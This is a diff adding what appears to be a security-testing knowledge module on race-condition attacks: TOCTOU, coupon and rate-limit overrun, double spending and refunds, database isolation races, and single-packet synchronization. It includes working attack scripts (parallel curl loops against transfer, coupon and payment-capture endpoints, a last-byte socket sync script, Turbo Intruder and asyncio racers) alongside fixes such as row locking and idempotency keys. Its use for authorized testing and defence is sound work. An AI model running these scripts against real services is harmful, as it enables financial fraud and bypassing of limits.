@@ -1,0 +1,778 @@
+<race_condition_advanced_guide>
+<title>ADVANCED RACE CONDITIONS</title>
+
+<critical>Advanced race condition exploitation focuses on TOCTOU attacks, limit-overrun, double-spending, single-packet attacks, and database transaction races. Modern applications with distributed architectures are particularly vulnerable.</critical>
+
+<scope>
+- Time-of-check to time-of-use (TOCTOU) exploits
+- Limit-overrun attacks (rate limits, quotas, inventory)
+- Double-spending patterns in payment and credit systems
+- Single-packet attack techniques for tight synchronization
+- Database transaction race conditions
+- Distributed system races (microservices, event-driven architectures)
+- Optimistic concurrency control bypass
+</scope>
+
+<methodology>
+1. Identify state-changing operations with multiple steps or checks
+2. Map transaction boundaries and isolation levels
+3. Test with increasing concurrency levels (N=2, 5, 10, 20, 50, 100)
+4. Use specialized synchronization techniques (HTTP/2, last-byte sync, connection warming)
+5. Validate durable state changes (database, ledger, audit logs)
+6. Test across different interfaces (REST, GraphQL, WebSocket, gRPC)
+</methodology>
+
+<toctou_exploits>
+<concept>
+{% raw %}
+# Time-of-check to time-of-use (TOCTOU)
+# Window between validation and action
+
+# Classic pattern:
+# 1. Check: if user.balance >= amount
+# 2. Use: user.balance -= amount
+#
+# Race window: Between check and use
+# Attack: Multiple concurrent requests pass check before any uses
+{% endraw %}
+</concept>
+
+<balance_checks>
+{% raw %}
+# Balance/quota validation without atomic operations
+
+# Single request (denied)
+POST /api/transfer
+{"amount": 1000, "to": "attacker"}
+# Response: Insufficient balance (balance: 100)
+
+# Concurrent requests (may succeed)
+# Send 10 parallel requests with amount=100
+# If check is before deduction, all may pass validation
+# Result: overdraft of 900
+
+# Test script:
+for i in {1..10}; do
+  curl -X POST https://api.example.com/transfer \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"amount": 100, "to": "attacker"}' &
+done
+wait
+{% endraw %}
+</balance_checks>
+
+<file_existence_checks>
+{% raw %}
+# File or resource existence checks
+
+# Pattern:
+# 1. Check: if not exists("file.txt")
+# 2. Create: write("file.txt", content)
+
+# Race: Two processes both pass check, both create file
+# Result: One creation overwrites the other
+
+# Or with unique constraints:
+# 1. Check: SELECT * FROM users WHERE email = 'test@example.com'
+# 2. Insert: INSERT INTO users (email) VALUES ('test@example.com')
+#
+# Race: Both pass check, both attempt insert
+# Result: Duplicate key error (if unique constraint) or duplicate records
+{% endraw %}
+</file_existence_checks>
+
+<authentication_toctou>
+{% raw %}
+# Session/token validation
+
+# Password reset flow:
+# 1. Check token validity
+# 2. Mark token as used
+# 3. Update password
+#
+# Race: Submit same token multiple times
+# Result: Multiple password resets, multiple sessions created
+
+# OTP consumption:
+POST /api/auth/verify-otp
+{"code": "123456"}
+
+# Concurrent submissions of same OTP
+# If "used" flag is set after validation
+# Multiple requests may succeed
+{% endraw %}
+</authentication_toctou>
+
+<permission_checks>
+{% raw %}
+# Authorization checks before action
+
+# 1. Check: if user.hasPermission("delete_user")
+# 2. Action: deleteUser(targetUserId)
+#
+# Race window: Permission revoked between check and action
+
+# Test: 
+# Thread 1: Make privileged request repeatedly
+# Thread 2: Revoke permission
+# Some requests may complete after revocation
+{% endraw %}
+</permission_checks>
+</toctou_exploits>
+
+<limit_overrun_attacks>
+<rate_limit_bypass>
+{% raw %}
+# Rate limits implemented with non-atomic counters
+
+# Typical implementation:
+# 1. Get current count
+# 2. If count < limit, proceed
+# 3. Increment count
+#
+# Race window: Between get and increment
+
+# Attack: Send N requests simultaneously
+# All may read same (low) count
+# All proceed, then all increment
+# Result: N requests processed instead of limit
+
+# HTTP/2 technique for tight synchronization:
+# Open HTTP/2 connection
+# Send multiple requests on same connection
+# They arrive nearly simultaneously
+
+# Tool: Turbo Intruder (Burp Suite extension)
+# Tool: http2-rapid-fire (custom script)
+{% endraw %}
+</rate_limit_bypass>
+
+<quota_exhaustion>
+{% raw %}
+# API quotas, download limits, seat counts
+
+# Single request (denied):
+GET /api/download/large-file
+# Response: Quota exceeded (used: 10GB, limit: 10GB)
+
+# Concurrent approach:
+# 1. Reset to just under limit
+# 2. Send multiple download requests simultaneously
+# 3. Each checks quota, all pass
+# 4. All downloads proceed
+# Result: quota overrun
+
+# Similar for:
+# - API call limits
+# - Storage quotas
+# - Concurrent user limits
+# - Request per second (RPS) limits
+{% endraw %}
+</quota_exhaustion>
+
+<inventory_overbook>
+{% raw %}
+# Limited inventory/seat reservation
+
+# Stock check:
+# 1. Check: if product.stock >= quantity
+# 2. Reserve: product.stock -= quantity
+#
+# Race: Multiple purchases of last items
+
+# Test scenario:
+# Product has 5 units in stock
+# Send 10 concurrent purchase requests for 1 unit each
+# Expected: 5 succeed, 5 fail
+# Actual (if race vulnerable): All 10 succeed (oversold by 5)
+
+POST /api/cart/checkout
+{"items": [{"product_id": 123, "quantity": 1}]}
+
+# Similar issues in:
+# - Event ticket sales
+# - Limited-time offers
+# - Seat selection (flights, theaters)
+# - Coupon usage limits
+{% endraw %}
+</inventory_overbook>
+
+<single_use_tokens>
+{% raw %}
+# Tokens meant to be used once
+
+# Examples:
+# - Discount codes
+# - Gift cards
+# - Referral credits
+# - Password reset tokens
+# - Magic links
+
+# Pattern:
+# 1. Check: if token.valid and not token.used
+# 2. Apply: token.used = true; grant_benefit()
+#
+# Race: Submit token multiple times before "used" flag set
+
+# Test:
+for i in {1..20}; do
+  curl -X POST https://api.example.com/apply-coupon \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"code": "DISCOUNT50"}' &
+done
+wait
+
+# Expected: 1 success, 19 failures
+# Actual (if vulnerable): Multiple successes
+{% endraw %}
+</single_use_tokens>
+</limit_overrun_attacks>
+
+<double_spending_patterns>
+<payment_authorization>
+{% raw %}
+# Payment auth/capture flow
+
+# Step 1: Authorize payment
+POST /api/payments/authorize
+{"amount": 100, "source": "card_123"}
+# Response: {"auth_id": "auth_xyz", "status": "authorized"}
+
+# Step 2: Capture payment
+POST /api/payments/capture
+{"auth_id": "auth_xyz"}
+
+# Race: Multiple capture requests with same auth_id
+# If idempotency not enforced, multiple captures may succeed
+# Result: Double charging
+
+# Test with concurrent captures:
+for i in {1..5}; do
+  curl -X POST https://api.example.com/payments/capture \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"auth_id": "auth_xyz"}' &
+done
+{% endraw %}
+</payment_authorization>
+
+<credit_spending>
+{% raw %}
+# User credit/balance systems
+
+# Pattern:
+# 1. Check: user.credits >= cost
+# 2. Deduct: user.credits -= cost
+# 3. Provide service
+#
+# Race: Spend same credits multiple times
+
+# Scenario:
+# User has 100 credits
+# Service costs 100 credits
+# Send 5 concurrent purchase requests
+# All may pass credit check
+# Result: service provided 5 times, only 100 credits deducted
+
+POST /api/services/purchase
+{"service": "premium_feature", "cost": 100}
+{% endraw %}
+</credit_spending>
+
+<refund_double_dipping>
+{% raw %}
+# Refund processing
+
+# Vulnerable pattern:
+# 1. Check: if order.status == "paid"
+# 2. Refund: process_refund(order.amount)
+# 3. Update: order.status = "refunded"
+#
+# Race: Submit multiple refund requests
+# Both check status before either updates
+# Result: Double refund
+
+POST /api/orders/123/refund
+{"reason": "customer_request"}
+
+# Send concurrent refund requests
+# May result in multiple refunds for same order
+{% endraw %}
+</refund_double_dipping>
+
+<withdrawal_races>
+{% raw %}
+# Cryptocurrency or financial withdrawals
+
+# Pattern:
+# 1. Check: if account.balance >= amount
+# 2. External transfer: blockchain_transfer(amount)
+# 3. Deduct: account.balance -= amount
+#
+# Race: Multiple withdrawals before balance updated
+
+# Critical in:
+# - Cryptocurrency exchanges
+# - Banking APIs
+# - Wallet applications
+# - P2P payment systems
+{% endraw %}
+</withdrawal_races>
+</double_spending_patterns>
+
+<single_packet_attacks>
+<concept>
+{% raw %}
+# Single-packet attack: Tight synchronization technique
+# Goal: Packets arrive at same microsecond
+# Maximizes race condition success rate
+
+# Requires:
+# - HTTP/2 or multiple TCP connections
+# - Connection pre-warming
+# - Last-byte synchronization
+{% endraw %}
+</concept>
+
+<http2_multiplexing>
+{% raw %}
+# HTTP/2 allows multiple requests on single connection
+# All requests sent in parallel streams
+
+# Tools:
+# - curl with --http2
+# - h2load (HTTP/2 load testing)
+# - Custom Python with hyper library
+
+# Example with curl:
+curl --http2-prior-knowledge \
+  -X POST https://api.example.com/endpoint \
+  -d 'data1' &
+curl --http2-prior-knowledge \
+  -X POST https://api.example.com/endpoint \
+  -d 'data2' &
+
+# Better: Use single HTTP/2 connection
+# Send multiple requests as separate streams
+{% endraw %}
+</http2_multiplexing>
+
+<last_byte_synchronization>
+{% raw %}
+# Technique: Hold back last byte of request
+# Release all last bytes simultaneously
+
+# Steps:
+# 1. Open N TCP connections
+# 2. Send all but last byte of each request
+# 3. Wait for all connections ready
+# 4. Send last byte of all requests simultaneously
+# 5. Requests arrive at nearly same time
+
+# Implementation:
+import socket
+import time
+
+sockets = []
+for i in range(10):
+    s = socket.socket()
+    s.connect(('api.example.com', 443))
+    # Send request except last byte
+    s.send(b'POST /endpoint HTTP/1.1\r\n...\r\n\r\ndata_without_last_byt')
+    sockets.append(s)
+
+# Synchronize
+time.sleep(0.1)
+
+# Send last byte to all
+for s in sockets:
+    s.send(b'e')
+{% endraw %}
+</last_byte_synchronization>
+
+<connection_warming>
+{% raw %}
+# Pre-establish TCP and TLS connections
+# Removes connection establishment jitter
+
+# Steps:
+# 1. Open connections
+# 2. Complete TLS handshake
+# 3. Send initial HTTP request (e.g., HEAD)
+# 4. Keep connections alive
+# 5. Use warmed connections for race attack
+
+# Reduces timing variance from:
+# - DNS resolution
+# - TCP handshake
+# - TLS negotiation
+# - Initial routing
+{% endraw %}
+</connection_warming>
+
+<tools>
+{% raw %}
+# Turbo Intruder (Burp Suite)
+# - Gate mechanism for synchronization
+# - HTTP/2 support
+# - Parallel request engine
+
+# Example Turbo Intruder script:
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=1,
+                          engine=Engine.BURP2)
+    
+    # Queue all requests
+    for i in range(20):
+        engine.queue(target.req)
+    
+    # Open gate to send simultaneously
+    engine.openGate('race')
+
+# Custom Python with asyncio
+import asyncio
+import aiohttp
+
+async def race_request(session, url, data):
+    async with session.post(url, json=data) as response:
+        return await response.text()
+
+async def main():
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for i in range(20):
+            task = race_request(session, url, data)
+            tasks.append(task)
+        
+        # Execute all simultaneously
+        results = await asyncio.gather(*tasks)
+{% endraw %}
+</tools>
+</single_packet_attacks>
+
+<database_transaction_races>
+<isolation_levels>
+{% raw %}
+# Database isolation levels affect race conditions
+
+# READ UNCOMMITTED
+# - Can read uncommitted changes
+# - Dirty reads possible
+# - No transaction isolation
+
+# READ COMMITTED (most common)
+# - Reads only committed data
+# - Non-repeatable reads possible
+# - Race conditions common
+
+# REPEATABLE READ
+# - Same query returns same results
+# - Phantom reads possible
+# - Some race conditions prevented
+
+# SERIALIZABLE
+# - Full isolation
+# - No race conditions (but performance cost)
+# - Transactions appear sequential
+{% endraw %}
+</isolation_levels>
+
+<lost_updates>
+{% raw %}
+# Lost update problem
+
+# Transaction 1:
+SELECT balance FROM accounts WHERE id = 123;  -- balance = 100
+-- balance_new = balance + 50
+UPDATE accounts SET balance = 150 WHERE id = 123;
+
+# Transaction 2 (concurrent):
+SELECT balance FROM accounts WHERE id = 123;  -- balance = 100
+-- balance_new = balance + 30
+UPDATE accounts SET balance = 130 WHERE id = 123;
+
+# Result: Balance is 130, not 180
+# Second transaction overwrites first
+
+# Solution: Use atomic operations
+UPDATE accounts SET balance = balance + 50 WHERE id = 123;
+{% endraw %}
+</lost_updates>
+
+<phantom_reads>
+{% raw %}
+# Phantom reads: New rows appear in transaction
+
+# Transaction 1:
+BEGIN;
+SELECT COUNT(*) FROM orders WHERE status = 'pending';  -- 5 rows
+-- Some logic
+SELECT COUNT(*) FROM orders WHERE status = 'pending';  -- 7 rows (!)
+COMMIT;
+
+# Between selects, Transaction 2 inserted 2 new pending orders
+
+# Attack: Insert data that bypasses business logic checks
+{% endraw %}
+</phantom_reads>
+
+<select_for_update>
+{% raw %}
+# SELECT FOR UPDATE provides row-level locking
+# But must be used correctly
+
+# Vulnerable:
+SELECT * FROM accounts WHERE id = 123;  -- No lock
+-- Check balance
+UPDATE accounts SET balance = balance - 100 WHERE id = 123;
+
+# Secure:
+SELECT * FROM accounts WHERE id = 123 FOR UPDATE;  -- Locked
+-- Check balance
+UPDATE accounts SET balance = balance - 100 WHERE id = 123;
+
+# Test: Concurrent transactions
+# Without FOR UPDATE: both may succeed
+# With FOR UPDATE: second waits for first to complete
+{% endraw %}
+</select_for_update>
+
+<optimistic_locking>
+{% raw %}
+# Optimistic concurrency control with version field
+
+# Pattern:
+SELECT id, balance, version FROM accounts WHERE id = 123;
+-- balance = 100, version = 5
+
+UPDATE accounts 
+SET balance = 50, version = 6 
+WHERE id = 123 AND version = 5;
+
+# If version changed, update fails
+# Application should retry
+
+# Test: Omit version check
+UPDATE accounts SET balance = 50 WHERE id = 123;
+# Race condition possible
+
+# Or: Supply stale version
+UPDATE accounts SET balance = 50, version = 6 WHERE id = 123 AND version = 4;
+# Should fail but check if validated
+{% endraw %}
+</optimistic_locking>
+</database_transaction_races>
+
+<distributed_races>
+<microservices>
+{% raw %}
+# Race conditions in distributed systems
+
+# Service A:
+POST /service-a/reserve
+# Reserves inventory
+
+# Service B:
+POST /service-b/charge
+# Charges payment
+
+# Race: Simultaneous calls to both services
+# Payment charged but inventory not reserved
+# Or vice versa
+
+# Eventual consistency gaps
+# Service A updates its DB
+# Service B queries Service A's DB before replication
+# Stale read causes race condition
+{% endraw %}
+</microservices>
+
+<event_driven>
+{% raw %}
+# Event-driven architecture races
+
+# Event: OrderCreated
+# Listener 1: Send confirmation email
+# Listener 2: Reserve inventory
+# Listener 3: Charge payment
+
+# Races:
+# - Multiple listeners process same event
+# - Events processed out of order
+# - Retry logic causes duplicate processing
+
+# Test:
+# - Publish same event multiple times rapidly
+# - Check for duplicate processing
+# - Verify idempotency keys
+{% endraw %}
+</event_driven>
+
+<saga_patterns>
+{% raw %}
+# Saga pattern for distributed transactions
+
+# Order Saga:
+# 1. Create order (Service A)
+# 2. Reserve inventory (Service B)
+# 3. Charge payment (Service C)
+# 4. Ship order (Service D)
+
+# Compensation if any step fails
+# Race: Compensation and forward path overlap
+
+# Test:
+# - Trigger failure at different stages
+# - Check if compensation runs multiple times
+# - Verify compensating action idempotency
+{% endraw %}
+</saga_patterns>
+
+<message_queues>
+{% raw %}
+# At-least-once delivery guarantees
+
+# Consumer receives same message multiple times
+# Must be idempotent
+
+# Test:
+# - Send duplicate messages
+# - Check for duplicate side effects
+# - Verify deduplication logic
+
+# Example:
+# Message: "Add 100 credits to user 123"
+# Received twice
+# User should get 100 credits, not 200
+{% endraw %}
+</message_queues>
+</distributed_races>
+
+<advanced_techniques>
+<cross_channel_races>
+{% raw %}
+# Different interfaces to same backend
+
+# Test same operation via:
+# - REST API
+# - GraphQL
+# - WebSocket
+# - gRPC
+# - Admin panel
+
+# Different code paths may have different protections
+
+# Example:
+POST /api/transfer (protected with idempotency key)
+POST /graphql (no idempotency key)
+mutation { transfer(amount: 100) }
+
+# Race between REST and GraphQL
+{% endraw %}
+</cross_channel_races>
+
+<role_timing_attacks>
+{% raw %}
+# Exploit timing windows in role/permission changes
+
+# Admin grants permission
+# User exploits permission
+# Admin revokes permission
+# User's request (started before revoke) still completes
+
+# Test:
+# 1. Start privileged operation (with delay)
+# 2. Revoke permission during operation
+# 3. Check if operation completes
+{% endraw %}
+</role_timing_attacks>
+
+<cache_races>
+{% raw %}
+# Race conditions with cache updates
+
+# Pattern:
+# 1. Read from cache
+# 2. If miss, read from DB
+# 3. Write to cache
+#
+# Race: Multiple processes cache-miss simultaneously
+# All read from DB, all write to cache
+# Could cause N times the database load
+
+# Or: Cache invalidation races
+# 1. Update DB
+# 2. Invalidate cache
+#
+# Race: Read happens between update and invalidation
+# Stale data cached
+{% endraw %}
+</cache_races>
+
+<session_races>
+{% raw %}
+# Session storage race conditions
+
+# Concurrent requests in same session
+# Both read session, both modify, both write
+
+# Example:
+# Session: {cart: [item1]}
+# Request A: Add item2
+# Request B: Add item3
+# Both read {cart: [item1]}
+# A writes {cart: [item1, item2]}
+# B writes {cart: [item1, item3]}
+# Result: item2 lost
+
+# Test: Make concurrent requests with same session cookie
+{% endraw %}
+</session_races>
+</advanced_techniques>
+
+<validation>
+1. Single request fails but N concurrent requests succeed (where N > 1 should fail)
+2. Durable state change proven (database query, ledger, audit log)
+3. Reproducible with synchronization technique (HTTP/2, last-byte sync, etc.)
+4. Demonstrated across multiple test runs (at least 3/5 success rate)
+5. Clear evidence of invariant violation (negative balance, oversold inventory, duplicate charges)
+6. Cross-channel test if applicable (REST, GraphQL, WebSocket)
+</validation>
+
+<false_positives>
+- Truly idempotent operations with proper locking
+- Serializable transaction isolation
+- Atomic database operations (UPDATE ... SET x = x + 1)
+- Proper use of SELECT FOR UPDATE
+- Distributed locks with fencing tokens
+- Idempotency keys properly implemented and scoped
+</false_positives>
+
+<impact>
+- Financial loss (double spending, overdrafts, double refunds)
+- Policy bypass (rate limits, quotas, inventory limits)
+- Data integrity violations (duplicate records, inconsistent state)
+- Privilege escalation (role changes, permission bypass)
+- Denial of service (quota exhaustion, resource depletion)
+</impact>
+
+<pro_tips>
+1. Start with N=10 parallel requests, increase to find minimum for success
+2. HTTP/2 multiplexing is most effective for tight synchronization
+3. Connection warming eliminates network jitter
+4. Last-byte sync is advanced but highly effective
+5. Test across all interfaces (REST, GraphQL, WebSocket, gRPC)
+6. Look for read-modify-write patterns without atomicity
+7. Check database transaction logs to prove race
+8. Focus on financial operations (payments, credits, refunds)
+9. Test single-use tokens (coupons, OTPs, magic links)
+10. Distributed systems are more vulnerable (eventual consistency)
+11. Idempotency keys often have inadequate scope (check per-path vs per-user)
+12. Cache-before-commit windows are exploitable
+13. Background jobs and webhooks often lack race protection
+14. Use correlation IDs to trace concurrent request handling
+15. Timing attacks can widen race windows (add artificial delay to backend)
+</pro_tips>
+
+<remember>Race conditions are not just about sending requests fast—they're about precise synchronization and understanding transaction boundaries. Every multi-step operation without proper locking is potentially vulnerable. Modern distributed systems amplify race condition risks. HTTP/2, last-byte sync, and connection warming are essential techniques. Always validate with durable state changes, not just response codes.</remember>
+</race_condition_advanced_guide>
